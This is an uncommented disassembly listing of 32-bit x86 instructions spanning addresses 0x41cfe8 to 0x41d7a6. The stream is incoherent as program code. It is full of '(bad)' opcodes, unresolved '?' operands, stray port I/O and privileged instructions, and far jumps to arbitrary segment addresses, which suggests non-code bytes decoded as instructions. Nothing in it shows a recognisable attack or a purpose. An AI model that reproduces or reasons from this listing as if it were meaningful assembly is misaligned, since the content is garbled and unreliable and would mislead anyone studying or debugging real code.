  41cfe8:	jae    0x41cf7a
  41cfea:	pusha  
  41cfeb:	sbb    DWORD PTR [edi+0x5c257806],eax
  41cff1:	icebp  
  41cff2:	and    BYTE PTR [esi+0x31],cl
  41cff5:	mov    ecx,0xa29fd6e7
  41cffa:	mov    ds:0xd488de80,al
  41cfff:	and    ecx,DWORD PTR [edi-0x2e]
  41d002:	sbb    esp,edx
  41d004:	jmp    0x939d1744
  41d009:	es call 0xe9c8:0xc7c7b61
  41d011:	clc    
  41d012:	inc    esi
  41d013:	bound  eax,QWORD PTR [ebp+eiz*8-0x5b]
  41d017:	xchg   esi,eax
  41d018:	icebp  
  41d019:	(bad)  [edi+eiz*8+0x75]
  41d01d:	out    0x64,al
  41d01f:	cmp    al,0x71
  41d021:	(bad)  
  41d022:	jg     0x41cfb5
  41d024:	adc    esi,DWORD PTR [eax+0xe]
  41d027:	xlat   BYTE PTR ds:[ebx]
  41d028:	sahf   
  41d029:	into   
  41d02a:	gs ss popfw 
  41d02e:	jns    0x41d0a9
  41d030:	stc    
  41d031:	inc    esp
  41d032:	xchg   dl,dh
  41d034:	jo     0x41cfea
  41d036:	arpl   WORD PTR [ecx+0x4e],si
  41d039:	int    0x10
  41d03b:	push   esp
  41d03c:	add    ah,dl
  41d03e:	dec    edi
  41d03f:	mov    al,BYTE PTR [ecx+0x6f]
  41d042:	imul   ebx,DWORD PTR [eax+0x74752700],0xffffff80
  41d049:	shr    edx,1
  41d04b:	adc    eax,0x42347f41
  41d050:	sahf   
  41d051:	xlat   BYTE PTR ds:[ebx]
  41d052:	imul   edx,DWORD PTR [ecx-0x78c6ebf4],0x74c04ff
  41d05c:	xor    ebx,DWORD PTR [ecx+edi*4+0x7ae1c5f2]
  41d063:	(bad)  
  41d064:	push   edx
  41d065:	out    dx,al
  41d066:	add    eax,0xd82610bb
  41d06b:	enter  0x8dd0,0xc6
  41d06f:	adc    al,0xda
  41d071:	sub    ch,BYTE PTR [ecx]
  41d073:	push   esi
  41d074:	lea    edx,[edi-0x70223b3f]
  41d07a:	add    eax,0x62f4b580
  41d07f:	fnstenv [ecx-0x22568dd2]
  41d085:	push   ebp
  41d086:	jle    0x41d045
  41d088:	sub    DWORD PTR [ecx],ebx
  41d08a:	retf   
  41d08b:	cmp    eax,0x4387aeef
  41d090:	cmp    ecx,DWORD PTR [ebx-0x44]
  41d093:	into   
  41d094:	inc    ebx
  41d095:	enter  0xcab7,0xe0
  41d099:	pop    ebp
  41d09a:	push   esi
  41d09b:	mov    DWORD PTR [esi],0xe50f85f
  41d0a1:	mov    ah,0xe8
  41d0a3:	arpl   dx,cx
  41d0a5:	(bad)  
  41d0a6:	test   DWORD PTR [edi],ebx
  41d0a8:	cmp    DWORD PTR [ebp-0x21],eax
  41d0ab:	inc    edx
  41d0ac:	inc    edx
  41d0ad:	dec    ecx
  41d0ae:	mov    ebp,0x7f7f7bb7
  41d0b3:	fucomip st,st(0)
  41d0b5:	pop    ebp
  41d0b6:	inc    esi
  41d0b7:	les    esi,FWORD PTR [ebp-0xd]
  41d0ba:	push   edx
  41d0bb:	jo     0x41d0ef
  41d0bd:	adc    ecx,DWORD PTR [edx-0x33]
  41d0c0:	mov    ecx,0xd0098de6
  41d0c5:	popa   
  41d0c6:	push   edi
  41d0c7:	(bad)  
  41d0c8:	cmp    eax,0x62b31978
  41d0cd:	(bad)  
  41d0ce:	lock scas al,BYTE PTR es:[edi]
  41d0d0:	xchg   BYTE PTR [ebp-0x56],cl
  41d0d3:	mul    BYTE PTR [esi-0x340a0308]
  41d0d9:	mov    ds:0x58ecf9df,al
  41d0de:	push   cs
  41d0df:	in     al,0xcd
  41d0e1:	jp     0x41d0f4
  41d0e3:	and    DWORD PTR [ecx],esp
  41d0e5:	and    al,0x4
  41d0e7:	fsin   
  41d0e9:	in     al,dx
  41d0ea:	sub    esp,edx
  41d0ec:	in     eax,dx
  41d0ed:	add    eax,0x1fdcd3d9
  41d0f2:	sbb    eax,0x80f80a48
  41d0f7:	push   esi
  41d0f8:	lods   eax,DWORD PTR ds:[esi]
  41d0f9:	shl    dl,cl
  41d0fb:	(bad)  
  41d0fd:	leave  
  41d0fe:	pop    ecx
  41d0ff:	repz sub BYTE PTR [edi],al
  41d102:	pop    ss
  41d103:	pop    esp
  41d104:	rcr    DWORD PTR [ecx+0x79],1
  41d107:	mov    bh,0xf5
  41d109:	add    eax,0xf00db155
  41d10e:	jns    0x41d175
  41d110:	pop    eax
  41d111:	sbb    eax,0x716a68d1
  41d116:	scas   al,BYTE PTR es:[edi]
  41d117:	aas    
  41d118:	and    bl,bh
  41d11a:	pusha  
  41d11b:	fistp  QWORD PTR [ebp+0x7e623a67]
  41d121:	mov    ebp,cs
  41d123:	xchg   ebp,eax
  41d124:	aaa    
  41d125:	loopne 0x41d130
  41d127:	and    eax,0xce4bf723
  41d12c:	ror    BYTE PTR [edi-0x444e10ed],1
  41d132:	out    0x3c,eax
  41d134:	lea    ebx,[ebx+edx*1-0x59]
  41d138:	into   
  41d139:	jge    0x41d127
  41d13b:	sahf   
  41d13c:	or     edi,DWORD PTR [ebx]
  41d13e:	sbb    edi,DWORD PTR [eax]
  41d140:	shr    DWORD PTR [edx],1
  41d142:	(bad)  
  41d143:	pop    ebx
  41d144:	shr    BYTE PTR [edx+0x66],0x48
  41d148:	mov    ch,BYTE PTR [edx-0x62]
  41d14b:	or     al,0xf8
  41d14d:	imul   BYTE PTR [eax+edx*2]
  41d150:	inc    edi
  41d151:	jg     0x41d152
  41d153:	fldenv [ebp-0x619a363a]
  41d159:	jl     0x41d1cc
  41d15b:	sub    eax,DWORD PTR [edx-0x8]
  41d15e:	mov    ebp,0x42b9d4c
  41d163:	sbb    bh,dl
  41d165:	xor    BYTE PTR [ecx],dh
  41d167:	dec    esp
  41d168:	(bad)  
  41d169:	out    dx,eax
  41d16a:	jbe    0x41d131
  41d16c:	sbb    edx,DWORD PTR [ebp-0x329b97ee]
  41d172:	mov    bl,0x9d
  41d174:	jns    0x41d18d
  41d176:	adc    ebx,DWORD PTR [eax]
  41d178:	ror    BYTE PTR [ebx+0x786e6b12],1
  41d17e:	cwde   
  41d17f:	int3   
  41d180:	mov    WORD PTR [ebx],?
  41d182:	enter  0xd085,0xaa
  41d186:	dec    edi
  41d187:	or     DWORD PTR ds:0xfbfcd574,ebp
  41d18d:	aad    0xbb
  41d18f:	sti    
  41d190:	(bad)  
  41d191:	or     eax,0xcd7b6c00
  41d196:	add    al,0xe8
  41d198:	(bad)  
  41d199:	not    BYTE PTR [ecx+ebx*8-0x751accc7]
  41d1a0:	popa   
  41d1a1:	ror    DWORD PTR [ebp+eiz*2+0x64a247c6],1
  41d1a8:	mov    bh,0x6e
  41d1aa:	dec    eax
  41d1ab:	xor    cl,BYTE PTR [edx]
  41d1ad:	retf   
  41d1ae:	and    al,0xf8
  41d1b0:	pop    ds
  41d1b1:	sub    esi,DWORD PTR [ecx]
  41d1b3:	dec    edx
  41d1b4:	aad    0x9f
  41d1b6:	cmp    eax,ebp
  41d1b8:	or     al,0x71
  41d1ba:	jns    0x41d1d8
  41d1bc:	loope  0x41d1c0
  41d1be:	xor    al,0x75
  41d1c0:	loop   0x41d153
  41d1c2:	sbb    al,0x48
  41d1c4:	sbb    BYTE PTR [esi-0x74768d03],bh
  41d1ca:	mov    al,0x32
  41d1cc:	push   esp
  41d1cd:	fdiv   st,st(0)
  41d1cf:	mov    edx,0x54efe96a
  41d1d4:	call   0xc8de:0xdddbfc50
  41d1db:	cmp    eax,0xeea84657
  41d1e0:	out    dx,al
  41d1e1:	inc    edx
  41d1e2:	or     bl,BYTE PTR [ecx+0x40dc0424]
  41d1e8:	mov    DWORD PTR [ebx+0xfb7a24b],esp
  41d1ee:	data16 jbe 0x41d1ca
  41d1f1:	aad    0x52
  41d1f3:	and    ebp,0x856ee4d6
  41d1f9:	inc    ecx
  41d1fa:	lea    esi,[edi]
  41d1fc:	mov    bl,0xd2
  41d1fe:	sub    eax,DWORD PTR [edx-0x22]
  41d201:	aaa    
  41d202:	or     DWORD PTR [ebx-0x6945b520],edi
  41d208:	in     eax,0x3
  41d20a:	pop    edi
  41d20b:	repz lds ecx,FWORD PTR [ebx-0x22b19d09]
  41d212:	imul   ebp,DWORD PTR [ecx+ebp*1+0x51baf238],0xd1555eb6
  41d21d:	mov    dl,0x7f
  41d21f:	popa   
  41d220:	mov    edx,0x12fbaca8
  41d225:	(bad)  
  41d227:	test   BYTE PTR [edi+0x3e],bh
  41d22a:	(bad)  
  41d22c:	cdq    
  41d22d:	xchg   ebx,eax
  41d22e:	fcomip st,st(2)
  41d230:	mov    eax,ds:0xfde0aea2
  41d235:	stos   BYTE PTR es:[edi],al
  41d236:	pop    es
  41d237:	repz push esp
  41d239:	mov    ds:0x7cbbda90,eax
  41d23e:	loope  0x41d24b
  41d240:	jp     0x41d2c1
  41d242:	in     al,dx
  41d243:	mov    al,ds:0x96188110
  41d248:	adc    al,0x14
  41d24a:	cmp    DWORD PTR [esi],0xffffffa4
  41d24d:	xor    eax,0xf993bc14
  41d252:	(bad)  
  41d254:	jno    0x41d20c
  41d256:	test   eax,0x529d0b45
  41d25b:	pop    ecx
  41d25c:	leave  
  41d25d:	xchg   esp,eax
  41d25e:	mov    al,0xee
  41d260:	cld    
  41d261:	or     DWORD PTR [eax],esi
  41d263:	mov    eax,ds:0x1bbec391
  41d268:	sbb    edx,DWORD PTR ds:0x8982694d
  41d26e:	stos   DWORD PTR es:[edi],eax
  41d26f:	sub    DWORD PTR [eax+0x10a90377],edx
  41d275:	das    
  41d276:	and    ah,bl
  41d278:	pop    esp
  41d279:	dec    esi
  41d27a:	xchg   ecx,eax
  41d27b:	fistp  DWORD PTR [edi]
  41d27d:	mov    ?,WORD PTR [ebx+0x6]
  41d280:	loope  0x41d20e
  41d282:	bound  ebx,QWORD PTR [edi]
  41d284:	pop    esi
  41d285:	addr16 popa 
  41d287:	ins    DWORD PTR es:[edi],dx
  41d288:	adc    ebp,0xe3e43900
  41d28e:	inc    ecx
  41d28f:	mov    ds:0x9fa3d41a,eax
  41d294:	pop    edx
  41d295:	jb     0x41d2de
  41d297:	out    dx,eax
  41d298:	retf   
  41d299:	bound  ebp,QWORD PTR [ebx+0x82a1f90]
  41d29f:	xor    edx,esi
  41d2a1:	out    dx,al
  41d2a2:	int    0xea
  41d2a4:	ret    
  41d2a5:	stc    
  41d2a6:	and    edx,esp
  41d2a8:	ins    BYTE PTR es:[edi],dx
  41d2a9:	dec    edi
  41d2aa:	sbb    al,0xf0
  41d2ac:	mov    ah,0xb
  41d2ae:	adc    al,0xab
  41d2b0:	xchg   DWORD PTR [edx+0x37c43d43],edx
  41d2b6:	std    
  41d2b7:	dec    ebp
  41d2b8:	imul   edx,DWORD PTR [ebx+0x28],0x232ea27a
  41d2bf:	std    
  41d2c0:	and    al,0x93
  41d2c2:	or     bl,bh
  41d2c4:	aad    0xe5
  41d2c6:	mov    ebp,0x273e4279
  41d2cb:	sbb    al,BYTE PTR [ecx]
  41d2cd:	jnp    0x41d2a6
  41d2cf:	sbb    ebx,ecx
  41d2d1:	inc    ecx
  41d2d2:	imul   edi,DWORD PTR [edi+0xb],0xffffffb2
  41d2d6:	test   BYTE PTR [ebx+0x6223d763],bl
  41d2dc:	es inc eax
  41d2de:	adc    eax,0x2e831bb5
  41d2e3:	jo     0x41d2b4
  41d2e5:	mov    ds:0xa1efd8c3,eax
  41d2ea:	adc    DWORD PTR [esi+0x68],ebp
  41d2ed:	mov    ah,al
  41d2ef:	test   DWORD PTR [esi+eax*8+0x47],0x93a5b287
  41d2f7:	inc    ebx
  41d2f8:	mov    ds:0xbe65e33a,eax
  41d2fd:	in     eax,dx
  41d2fe:	dec    ebx
  41d2ff:	dec    eax
  41d300:	mov    cs,WORD PTR [edx+0x26]
  41d303:	lock test DWORD PTR ds:0x1e0ef27,0x10d2de90
  41d30e:	or     eax,0x643789b4
  41d313:	and    al,0x7d
  41d315:	inc    edx
  41d316:	mov    eax,ds:0x84a0dc37
  41d31b:	stc    
  41d31c:	xchg   esi,eax
  41d31d:	loop   0x41d35a
  41d31f:	shl    bl,0xdd
  41d322:	dec    ecx
  41d323:	pushf  
  41d324:	mov    eax,ds:0xbb594ff8
  41d329:	fbld   TBYTE PTR [esi+0x5a2658cb]
  41d32f:	cmp    edi,ecx
  41d331:	aaa    
  41d332:	sub    ebx,edi
  41d334:	gs int3 
  41d336:	mov    ah,0x41
  41d338:	or     BYTE PTR ds:0xf83f8bec,ah
  41d33e:	ja     0x41d3a4
  41d340:	or     bh,BYTE PTR [esi-0x728e8f1b]
  41d346:	sbb    esp,DWORD PTR [ecx+0xe]
  41d349:	xchg   BYTE PTR [ecx+0x3f],dh
  41d34c:	add    al,0xa3
  41d34e:	sbb    al,0x5e
  41d350:	jmp    0x144f:0xfe0ea66a
  41d357:	jg     0x41d2ff
  41d359:	(bad)  
  41d35a:	and    DWORD PTR [esi+0x68de0d1e],esp
  41d360:	push   ecx
  41d361:	mov    al,ds:0xeba0469a
  41d366:	iret   
  41d367:	loop   0x41d33c
  41d369:	adc    DWORD PTR [ecx+edi*1],eax
  41d36c:	inc    edi
  41d36d:	push   es
  41d36e:	xor    eax,0xd0565301
  41d373:	fisttp WORD PTR [ecx]
  41d375:	mov    ebp,gs
  41d377:	mov    al,ds:0x1b82593d
  41d37c:	ret    
  41d37d:	cmc    
  41d37e:	sbb    al,0x97
  41d380:	pop    es
  41d381:	imul   eax,DWORD PTR [ebx],0x97930f5a
  41d387:	and    al,0xc5
  41d389:	adc    BYTE PTR [ecx+0x2c4048a0],0xd5
  41d390:	add    al,0x22
  41d392:	popf   
  41d393:	xchg   esi,eax
  41d394:	push   ds
  41d395:	push   cs
  41d396:	and    al,0x69
  41d398:	dec    edi
  41d399:	jo     0x41d3cd
  41d39b:	adc    BYTE PTR ds:0x2bdcf273,ch
  41d3a1:	jp     0x41d3dd
  41d3a3:	out    0xba,al
  41d3a5:	pop    es
  41d3a6:	xchg   DWORD PTR [ebx+0x6ace96fa],edi
  41d3ac:	jmp    0x89f6:0x420492c9
  41d3b3:	dec    eax
  41d3b4:	cmp    al,0x0
  41d3b6:	sbb    DWORD PTR [ebp+0x11c07ea],esi
  41d3bc:	or     BYTE PTR [edx-0x3cfbcb70],al
  41d3c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3c3:	xchg   esi,eax
  41d3c4:	mov    al,ds:0xf84d6122
  41d3c9:	xchg   esp,eax
  41d3ca:	jmp    0xb1af2198
  41d3cf:	sar    BYTE PTR [ebx],1
  41d3d1:	dec    eax
  41d3d2:	scas   al,BYTE PTR es:[edi]
  41d3d3:	enter  0x4c01,0x59
  41d3d7:	fild   DWORD PTR [edx]
  41d3d9:	sbb    esp,esp
  41d3db:	dec    eax
  41d3dc:	jns    0x41d362
  41d3de:	test   DWORD PTR [eax+0x49f21aa8],ecx
  41d3e4:	sub    bh,BYTE PTR [ebp+0x18279a89]
  41d3ea:	loopne 0x41d437
  41d3ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3ed:	xchg   esp,eax
  41d3ee:	adc    ecx,eax
  41d3f0:	xlat   BYTE PTR ds:[ebx]
  41d3f1:	hlt    
  41d3f2:	sub    eax,0x89e4d652
  41d3f7:	dec    edi
  41d3f8:	push   edi
  41d3fa:	mov    ds:0xd91da8fe,al
  41d3ff:	fild   QWORD PTR [esi+0x49b49e36]
  41d405:	mov    al,BYTE PTR [edx-0x2e5df530]
  41d40b:	xchg   esi,eax
  41d40c:	(bad)  
  41d40d:	sub    ah,BYTE PTR [esi]
  41d40f:	ss in  eax,0xcc
  41d412:	xchg   esp,eax
  41d413:	scas   eax,DWORD PTR es:[edi]
  41d414:	call   0x380c9562
  41d419:	loop   0x41d39e
  41d41b:	(bad)  
  41d41c:	(bad)  
  41d41d:	iret   
  41d41e:	inc    ebx
  41d41f:	mov    al,BYTE PTR [edx-0x51534ff4]
  41d425:	mov    cl,0x22
  41d427:	fst    st(7)
  41d429:	std    
  41d42a:	mov    ah,0x3b
  41d42c:	jp     0x41d497
  41d42e:	test   eax,0x215876c7
  41d433:	add    esp,DWORD PTR [ecx-0x10d7d96]
  41d439:	(bad)  
  41d43a:	adc    BYTE PTR [ebx-0x5f],bl
  41d43d:	pop    ss
  41d43e:	cdq    
  41d43f:	cmp    DWORD PTR [edi],ebp
  41d441:	adc    DWORD PTR [eax-0x2f],ecx
  41d444:	pop    ebx
  41d445:	pop    edx
  41d446:	daa    
  41d447:	add    DWORD PTR [edi-0x3f],eax
  41d44a:	shl    BYTE PTR [esi+0x3766e47d],0x56
  41d451:	int    0x63
  41d453:	jns    0x41d40a
  41d455:	push   ebx
  41d456:	dec    esi
  41d457:	sti    
  41d458:	sub    eax,0x355199df
  41d45d:	mov    edx,0x7a834221
  41d462:	loop   0x41d4a7
  41d464:	and    eax,0xb34a75a6
  41d469:	sub    DWORD PTR [edi+0x2f921e47],ebp
  41d46f:	aam    0x93
  41d471:	mov    dl,0xf8
  41d473:	aam    0xee
  41d475:	rcl    DWORD PTR [edx],0x1e
  41d478:	mov    ds:0x885ada9d,eax
  41d47d:	inc    esi
  41d47e:	out    dx,al
  41d47f:	push   ebx
  41d480:	sub    ebx,DWORD PTR [ebx]
  41d482:	xor    dh,BYTE PTR [esi+ebp*1-0x45]
  41d486:	cmp    eax,0x3f100130
  41d48b:	xor    BYTE PTR [edi],cl
  41d48d:	or     BYTE PTR [ebx-0x7205103d],ch
  41d493:	mov    bh,0xa6
  41d495:	inc    ecx
  41d496:	cld    
  41d497:	nop
  41d498:	cmp    eax,DWORD PTR [edx+0x335b7d6e]
  41d49e:	(bad)  
  41d49f:	out    dx,eax
  41d4a0:	mov    esi,0x8b69bc2b
  41d4a5:	scas   eax,DWORD PTR es:[edi]
  41d4a6:	stos   BYTE PTR es:[edi],al
  41d4a7:	jo     0x41d45b
  41d4a9:	and    esp,esp
  41d4ab:	inc    esi
  41d4ac:	fisttp QWORD PTR [esi]
  41d4ae:	jne    0x41d494
  41d4b0:	and    eax,0xfbde81ea
  41d4b5:	mov    bl,0x3e
  41d4b7:	(bad)  
  41d4b8:	mov    ds:0xdf253d9a,eax
  41d4bd:	pop    edi
  41d4be:	out    dx,eax
  41d4bf:	pop    ecx
  41d4c0:	clc    
  41d4c1:	inc    edx
  41d4c2:	xchg   BYTE PTR [ecx-0x2d],al
  41d4c5:	xchg   DWORD PTR [ebp+0x163ea88d],ebp
  41d4cb:	pop    ebx
  41d4cc:	daa    
  41d4cd:	xlat   BYTE PTR ds:[ebx]
  41d4ce:	imul   esp,DWORD PTR cs:[ebp+0x27],0xc19314f6
  41d4d6:	ds scas al,BYTE PTR es:[edi]
  41d4d8:	pop    edi
  41d4d9:	xchg   ecx,eax
  41d4da:	test   DWORD PTR [edx],0x86ac8649
  41d4e0:	aas    
  41d4e1:	sub    al,0x65
  41d4e3:	inc    eax
  41d4e4:	mov    bl,0x71
  41d4e6:	(bad)  [ecx+0x2b]
  41d4e9:	aas    
  41d4ea:	rol    BYTE PTR [ebx+0x43150e61],1
  41d4f0:	pusha  
  41d4f1:	adc    ah,BYTE PTR gs:[esi]
  41d4f4:	and    DWORD PTR [eax+0x1c],ebp
  41d4f7:	in     eax,0x5d
  41d4f9:	sbb    bl,dh
  41d4fb:	mov    ebp,0xc0b04397
  41d500:	out    dx,ax
  41d502:	scas   eax,DWORD PTR es:[di]
  41d504:	pop    edi
  41d505:	cmp    DWORD PTR [edi-0x3],ebx
  41d508:	pop    edx
  41d509:	daa    
  41d50a:	add    DWORD PTR [edi-0x5b],esp
  41d50d:	xor    BYTE PTR [edx+0x5e4f9f9],ah
  41d513:	pushf  
  41d514:	fst    DWORD PTR [esp+edx*4-0x17]
  41d518:	or     eax,0xb284aae4
  41d51d:	fistp  QWORD PTR [eax+0x7cce5a50]
  41d523:	loop   0x41d50b
  41d525:	push   ebp
  41d526:	cld    
  41d527:	pusha  
  41d528:	or     ah,bh
  41d52a:	les    ebx,FWORD PTR [esi-0x18]
  41d52d:	hlt    
  41d52e:	lea    esp,[ebp+0x35fe4aa]
  41d534:	ffree  st(0)
  41d536:	xlat   BYTE PTR ds:[ebx]
  41d537:	adc    al,0x2a
  41d539:	inc    ecx
  41d53a:	call   0xc8c2:0xa8e241d6
  41d541:	scas   eax,DWORD PTR es:[edi]
  41d542:	mov    ds:0xe672a529,al
  41d547:	hlt    
  41d548:	xchg   ebx,eax
  41d549:	jmp    0x393d:0x99e8ac71
  41d550:	sub    bx,cx
  41d553:	enter  0x6f52,0x63
  41d557:	out    0xd7,al
  41d559:	and    eax,0x4d
  41d55c:	or     ah,BYTE PTR [edi+0x42]
  41d55f:	mov    esi,?
  41d561:	dec    ebp
  41d562:	cmc    
  41d563:	sub    DWORD PTR [edi-0x52139698],edi
  41d569:	push   ebx
  41d56a:	hlt    
  41d56b:	xchg   edi,eax
  41d56c:	dec    eax
  41d56d:	mov    esi,0x6d97ab30
  41d572:	add    eax,0xf7ed4e81
  41d577:	jns    0x41d4ff
  41d579:	icebp  
  41d57a:	jecxz  0x41d578
  41d57c:	(bad)  
  41d57d:	scas   al,BYTE PTR es:[edi]
  41d57e:	iret   
  41d57f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d580:	xor    esi,ebx
  41d582:	pop    esi
  41d583:	mov    dl,0x10
  41d585:	jo     0x41d5b9
  41d587:	ins    BYTE PTR es:[edi],dx
  41d588:	scas   eax,DWORD PTR es:[edi]
  41d589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d58a:	bound  ecx,QWORD PTR [esi+ebx*4+0x558c513a]
  41d591:	and    DWORD PTR [esi+0x2e6062b],esi
  41d597:	adc    DWORD PTR [ebx],0xffffffa1
  41d59a:	dec    edx
  41d59b:	ss lahf 
  41d59d:	sub    ch,BYTE PTR [esi]
  41d59f:	(bad)
  41d5a3:	jmp    0x41d533
  41d5a5:	jecxz  0x41d592
  41d5a7:	fadd   st,st(2)
  41d5a9:	xchg   edx,eax
  41d5aa:	js     0x41d615
  41d5ac:	fmul   DWORD PTR ds:0xc871c9aa
  41d5b2:	fcomip st,st(5)
  41d5b4:	pop    ebx
  41d5b5:	jl     0x41d55f
  41d5b7:	adc    dl,BYTE PTR [edi+0x50]
  41d5ba:	mov    edx,0xe0af2b47
  41d5bf:	fidivr DWORD PTR [ebx]
  41d5c1:	lea    eax,[eax+eiz*4-0x1c]
  41d5c5:	out    dx,eax
  41d5c6:	lahf   
  41d5c7:	cmp    al,BYTE PTR [edi]
  41d5c9:	mov    edi,0xdf8300fc
  41d5ce:	cmp    ch,BYTE PTR [ecx+0x236f584c]
  41d5d4:	mov    eax,0xb346b88c
  41d5d9:	jg     0x41d58f
  41d5db:	fwait
  41d5dc:	sub    eax,0x6f469d3d
  41d5e1:	test   BYTE PTR [esi+0x59],cl
  41d5e4:	idiv   dh
  41d5e6:	and    eax,0x2c829f1c
  41d5eb:	aad    0x4b
  41d5ed:	add    DWORD PTR [ecx+0x4a],esp
  41d5f0:	push   ebx
  41d5f1:	daa    
  41d5f2:	push   ds
  41d5f3:	pop    edx
  41d5f4:	out    0x59,eax
  41d5f6:	lahf   
  41d5f7:	imul   ecx,DWORD PTR [esi],0x61
  41d5fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5fb:	mov    ss,WORD PTR [eax+0x5a5667dc]
  41d601:	jmp    0x7817:0x17ffc485
  41d608:	adc    BYTE PTR [ebx+0x7bc6754],cl
  41d60e:	sbb    edx,DWORD PTR gs:[ebx+0x68]
  41d612:	lahf   
  41d613:	xchg   edi,eax
  41d614:	xchg   edi,eax
  41d615:	loope  0x41d5f9
  41d617:	fimul  DWORD PTR [ebx]
  41d619:	pop    es
  41d61a:	sbb    BYTE PTR [edx+eax*1-0x1b],ch
  41d61e:	hlt    
  41d61f:	ret    
  41d620:	and    al,0x69
  41d622:	dec    ebp
  41d623:	std    
  41d624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d625:	imul   edi,eax,0xffffffd6
  41d628:	retf   0x127f
  41d62b:	jae    0x41d678
  41d62d:	mov    dh,0xa2
  41d62f:	repz aas 
  41d631:	and    bl,ah
  41d633:	inc    ebp
  41d634:	mov    ds:0x144bef84,al
  41d639:	mov    ds:0xdbbfb509,al
  41d63e:	sbb    eax,0x508d097f
  41d643:	cwde   
  41d644:	or     ecx,0xae74c87f
  41d64a:	dec    edx
  41d64b:	cs pop ecx
  41d64d:	jmp    edx
  41d64f:	adc    esp,0xe4db4dee
  41d655:	dec    esi
  41d656:	shl    DWORD PTR [esi],cl
  41d658:	push   ecx
  41d659:	xchg   DWORD PTR [ebx-0x231a6ed7],esp
  41d65f:	push   0x74
  41d661:	loop   0x41d6df
  41d663:	push   esi
  41d664:	and    BYTE PTR [ebx],bh
  41d666:	mov    edi,0xca0b8923
  41d66b:	jb     0x41d65d
  41d66d:	add    eax,0x99057ae
  41d672:	sub    cl,cl
  41d674:	cmp    BYTE PTR [edi-0x67fd6470],cl
  41d67a:	scas   eax,DWORD PTR es:[edi]
  41d67b:	stos   DWORD PTR es:[edi],eax
  41d67c:	mov    cl,0x37
  41d67e:	pop    ss
  41d67f:	test   al,0xa9
  41d681:	jl     0x41d6f3
  41d683:	lods   eax,DWORD PTR ds:[esi]
  41d684:	fimul  DWORD PTR [ecx]
  41d686:	(bad)  
  41d687:	fcomi  st,st(6)
  41d689:	fiadd  DWORD PTR [ecx+0x2c]
  41d68c:	icebp  
  41d68d:	and    al,0x57
  41d68f:	mov    ebp,0x58ff823b
  41d694:	sub    BYTE PTR [edi+0xb4335c5],al
  41d69a:	cmp    eax,0x5a77166a
  41d69f:	or     eax,ecx
  41d6a1:	fistp  WORD PTR [ebx-0x54f13805]
  41d6a7:	adc    BYTE PTR [edx],0x83
  41d6aa:	mov    cl,0x63
  41d6ac:	push   edx
  41d6ad:	or     edx,DWORD PTR [ecx+esi*2]
  41d6b0:	leave  
  41d6b1:	psubusw mm3,mm3
  41d6b4:	add    al,0xb9
  41d6b6:	or     edi,DWORD PTR [ebp-0x76733e4b]
  41d6bc:	call   0x679e:0x1335fd3b
  41d6c3:	xchg   edx,eax
  41d6c4:	sar    DWORD PTR [ecx-0xa],0x3e
  41d6c8:	cmp    ch,BYTE PTR [ecx-0x2f0356b6]
  41d6ce:	popf   
  41d6cf:	fcomp  st(5)
  41d6d1:	lock add eax,0xd6ca3ea3
  41d6d7:	mov    eax,ds:0x9a4a34c3
  41d6dc:	xlat   BYTE PTR ds:[ebx]
  41d6dd:	frstor [ebp-0x154e0e7b]
  41d6e3:	rcl    bh,cl
  41d6e5:	xlat   BYTE PTR ds:[ebx]
  41d6e6:	aad    0xa4
  41d6e8:	cmp    DWORD PTR [edx],0x25975e9a
  41d6ee:	mov    edx,0xed8bf116
  41d6f3:	loope  0x41d734
  41d6f5:	nop
  41d6f6:	rcr    BYTE PTR [eax+0x47d735fe],1
  41d6fc:	pop    ebx
  41d6fd:	es icebp 
  41d6ff:	arpl   WORD PTR [ebx-0x61],bx
  41d702:	mov    bh,0x93
  41d704:	(bad)
  41d707:	push   0xffffffd7
  41d709:	fmul   DWORD PTR [edi+0x1a239317]
  41d70f:	in     eax,dx
  41d710:	adc    ebp,DWORD PTR [ecx+0x84ad169]
  41d716:	inc    eax
  41d717:	lds    eax,FWORD PTR [eax]
  41d719:	out    0x45,eax
  41d71b:	stos   DWORD PTR es:[edi],eax
  41d71c:	push   ebp
  41d71d:	xor    BYTE PTR [edx-0x36],al
  41d720:	inc    esp
  41d721:	in     eax,0xba
  41d723:	outs   dx,DWORD PTR ds:[esi]
  41d724:	sar    bh,cl
  41d726:	stos   BYTE PTR es:[edi],al
  41d727:	scas   eax,DWORD PTR es:[edi]
  41d728:	push   esp
  41d729:	pop    eax
  41d72a:	mov    esi,ss
  41d72c:	sub    ecx,DWORD PTR [edx+0x1f54f6d2]
  41d732:	sub    esi,DWORD PTR [eax]
  41d734:	jns    0x41d712
  41d736:	stos   BYTE PTR es:[edi],al
  41d737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d738:	adc    al,0xde
  41d73a:	iret   
  41d73b:	xchg   edx,eax
  41d73c:	cmp    DWORD PTR [ecx+0x4cbec778],esp
  41d742:	jb     0x41d782
  41d744:	int    0x5e
  41d746:	popa   
  41d747:	pop    ebx
  41d748:	enter  0x9904,0x64
  41d74c:	cmp    al,ch
  41d74e:	(bad)  
  41d74f:	stc    
  41d750:	sub    al,0x76
  41d752:	jmp    0x3e4c:0x62e9938f
  41d759:	inc    esp
  41d75a:	push   ss
  41d75b:	push   es
  41d75c:	push   edi
  41d75d:	sub    ch,ah
  41d75f:	mov    ebx,0xf4ebf51d
  41d764:	jmp    0x61bf:0xe392108f
  41d76b:	je     0x41d78a
  41d76d:	(bad)  
  41d76e:	loopne 0x41d773
  41d770:	add    BYTE PTR [ebx-0x80],dl
  41d773:	fidivr DWORD PTR ds:0x5292a2f7
  41d779:	push   0x43
  41d77b:	or     eax,esi
  41d77d:	fwait
  41d77e:	pop    esi
  41d77f:	int3   
  41d780:	lea    ecx,[esi]
  41d782:	out    dx,eax
  41d783:	sbb    DWORD PTR [ebx-0x1a39ab26],edx
  41d789:	ins    DWORD PTR es:[edi],dx
  41d78a:	test   al,0x61
  41d78c:	mov    BYTE PTR [eiz*8+0x5329ab1d],ah
  41d793:	fnstsw WORD PTR [esi+0x6308c499]
  41d799:	push   0x56
  41d79b:	rcr    DWORD PTR [ecx+eiz*8+0x5abcd135],1
  41d7a2:	repnz cmp esi,esp
  41d7a5:	push   esi
  41d7a6:	push   esi
